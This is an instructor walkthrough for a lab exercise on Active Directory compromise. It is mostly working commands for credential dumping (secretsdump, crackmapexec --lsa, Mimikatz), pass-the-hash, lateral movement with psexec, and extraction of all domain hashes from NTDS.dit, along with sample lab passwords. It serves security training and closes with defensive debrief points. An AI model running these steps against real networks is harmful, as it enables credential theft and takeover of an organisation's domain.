# Walkthrough — SCEN-003: APT Lateral Movement

**INSTRUCTOR ONLY — Do not distribute to students**

---

## Phase 1: Initial Foothold

### Step 1: Access ws01
```bash
# Option A: PsExec via Impacket
impacket-psexec lab.local/jsmith:'Password123'@<ws01_ip>

# Option B: WinRM (if available)
evil-winrm -i <ws01_ip> -u jsmith -p 'Password123'

# Option C: SMB exec
impacket-smbexec lab.local/jsmith:'Password123'@<ws01_ip>
```

### Step 2: Situational Awareness
```bash
# From the shell on ws01
whoami /all
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
ipconfig /all
net share
```

---

## Phase 2: Credential Dumping

### Step 3: Dump LSASS
```bash
# Option A: remotely with secretsdump (preferred — no AV interaction)
impacket-secretsdump lab.local/jsmith:'Password123'@<ws01_ip>

# Option B: using pypykatz on a memory dump
# First get the lsass.dmp (requires local admin):
crackmapexec smb <ws01_ip> -u jsmith -p 'Password123' -d lab.local \
  --lsa

# Option C: Mimikatz (if running on Windows)
# privilege::debug
# sekurlsa::logonpasswords
```

Expected credential dump from ws01:
```
[*] Dumping cached domain logon information (domain/username:hash)
LAB.LOCAL/jsmith:Password123  (WDigest cleartext — V001)
LAB.LOCAL/svc_sql:Summer2024! (WDigest cleartext — cached from service)
```

### Step 4: Identify Pivot Accounts
```bash
# Test which accounts have admin access to other machines
crackmapexec smb <ws02_ip> -u svc_sql -p 'Summer2024!' -d lab.local
# Expected: no admin access on ws02

# Try jsmith on ws02
crackmapexec smb <ws02_ip> -u jsmith -p 'Password123' -d lab.local
# Expected: auth succeeds but no admin

# At this point students need to look deeper — check SMB shares
crackmapexec smb <ws01_ip> -u jsmith -p 'Password123' -d lab.local --shares
# Look for open shares that might contain credentials or scripts
```

---

## Phase 3: Lateral Movement

### Step 5: Move to ws02
```bash
# The intended path is via pass-the-hash using an NTLM hash
# from the LSASS dump, or via credentials found in shares/scripts.

# If WDigest gave us agarcia cleartext (cached on ws01):
impacket-psexec lab.local/agarcia:'Welcome2024!'@<ws02_ip>

# Alternatively, if students have NTLM hash:
impacket-psexec -hashes :<ntlm_hash> lab.local/agarcia@<ws02_ip>
```

### Step 6: Dump ws02 Credentials
```bash
# secretsdump on ws02
impacket-secretsdump lab.local/agarcia:'Welcome2024!'@<ws02_ip>

# Expected: agarcia has local admin on both ws02 and dc01
# The SAM dump will show local accounts
# The LSASS dump may show cached domain admin credentials
```

---

## Phase 4: Domain Compromise

### Step 7: Access DC
```bash
# agarcia is in the local Administrators group on dc01
impacket-psexec lab.local/agarcia:'Welcome2024!'@<dc01_ip>

# Verify domain admin access
whoami /all
# Should show Domain Admins membership or equivalent
```

### Step 8: NTDS.dit Extraction (Bonus)
```bash
# Full domain hash dump
impacket-secretsdump lab.local/agarcia:'Welcome2024!'@<dc01_ip> -just-dc

# This dumps ALL domain user hashes including:
# - Administrator
# - krbtgt (can be used for Golden Ticket)
# - All user accounts
```

---

## Credential Chain Summary

```
jsmith (Password123)          ← provided (phishing foothold)
    │
    ├── ws01 local admin      ← jsmith has local admin rights
    │   │
    │   └── LSASS dump        ← WDigest enabled (T1003.001)
    │       │
    │       ├── svc_sql creds ← cached from Kerberoast service
    │       └── agarcia creds ← cached from previous admin logon
    │
    └── agarcia (Welcome2024!) ← IT admin
        │
        ├── ws02 local admin  ← lateral movement (T1021.002)
        │
        └── dc01 local admin  ← domain compromise
            │
            └── NTDS.dit dump ← all domain hashes (T1003.003)
```

---

## Debrief Discussion Points

1. **Credential caching**: Windows caches logon credentials for offline use. An admin who logs into a workstation leaves their hash behind. This is why tiered administration (workstations, servers, DCs use different accounts) is essential.

2. **WDigest**: Storing cleartext credentials in LSASS was a convenience feature. It's disabled by default since Windows 8.1/2012 R2, but many orgs re-enable it or haven't patched older systems.

3. **Lateral movement detection**: Event ID 4624 Type 3 (network logon) from unexpected sources, especially when combined with 4672 (special privileges) on the target. NTLM authentication from a user who normally uses Kerberos is suspicious.

4. **Defense-in-depth**: LAPS (Local Administrator Password Solution), credential guard, protected users security group, tiered administration model, privileged access workstations (PAWs).

5. **Why this matters**: This exact kill chain (foothold → dump → pivot → DC) is the primary enterprise AD compromise path. APT29 (Cozy Bear), APT28 (Fancy Bear), and most ransomware operators follow this pattern.
